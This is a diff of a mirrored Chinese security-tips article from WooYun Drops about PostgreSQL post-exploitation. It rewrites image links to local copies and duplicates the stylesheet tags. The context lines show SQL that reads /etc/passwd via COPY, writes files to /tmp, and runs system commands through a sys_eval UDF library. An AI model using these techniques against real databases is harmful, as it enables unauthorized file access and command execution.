@@ -3,7 +3,7 @@
 			<head>
 			     <title>PostgreSQL的那点事儿 - 疯狗</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/218">http://drops.wooyun.org/tips/218</a></h1>
 				
@@ -26,19 +26,19 @@
 
 <h4>a）比如列目录</h4>
 
-<p><img src="http://static.wooyun.org/201307/2013070916495021606.png" alt="2013070916495021606.png"></p>
+<p><img src="../images_result/images/2013070916495021606.png" alt="2013070916495021606.png"></p>
 
 <h4>b）读取权限允许的文件</h4>
 
-<p><img src="http://static.wooyun.org/201307/2013070916501626793.png" alt="2013070916501626793.png"></p>
+<p><img src="../images_result/images/2013070916501626793.png" alt="2013070916501626793.png"></p>
 
 <p>还有个写文件函数测试并未成功，而且只能像data下写也是满足不了需求的。</p>
 
 <h4>c）比较可行的文件读取方案</h4>
 
-<p><img src="http://static.wooyun.org/201307/2013070916503429269.png" alt="2013070916503429269.png"></p>
+<p><img src="../images_result/images/2013070916503429269.png" alt="2013070916503429269.png"></p>
 
-<p><img src="http://static.wooyun.org/201307/2013070916510067232.png" alt="2013070916510067232.png"></p>
+<p><img src="../images_result/images/2013070916510067232.png" alt="2013070916510067232.png"></p>
 
 <pre><code>drop table wooyun;
 CREATE TABLE wooyun(t TEXT);
@@ -54,7 +54,7 @@ COPY wooyun(t) FROM '/etc/passwd';
 SELECT * FROM wooyun;
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201307/2013070916512953973.png" alt="2013070916512953973.png"></p>
+<p><img src="../images_result/images/2013070916512953973.png" alt="2013070916512953973.png"></p>
 
 <h4>d）写入文件</h4>
 
@@ -64,11 +64,11 @@ INSERT INTO wooyun(t) VALUES ('hello wooyun');
 COPY wooyun(t) TO '/tmp/wooyun';
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201307/2013070916514499642.png" alt="2013070916514499642.png"></p>
+<p><img src="../images_result/images/2013070916514499642.png" alt="2013070916514499642.png"></p>
 
 <p>读一下看看是否存在</p>
 
-<p><img src="http://static.wooyun.org/201307/2013070916515914176.png" alt="2013070916515914176.png"><br>
+<p><img src="../images_result/images/2013070916515914176.png" alt="2013070916515914176.png"><br>
 Bingo~</p>
 
 <h3>0x01 命令执行</h3>
@@ -180,7 +180,7 @@ lib_postgresqludf_sys.so
 <pre><code>select sys_eval('id'); 
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201307/2013070916522426778.jpg" alt="2013070916522426778.jpg"></p>
+<p><img src="../images_result/images/2013070916522426778.jpg" alt="2013070916522426778.jpg"></p>
 
 <p>也许服务器没装PostgreSQL的Perl、Python支持，但是C库是通用的。</p>
 
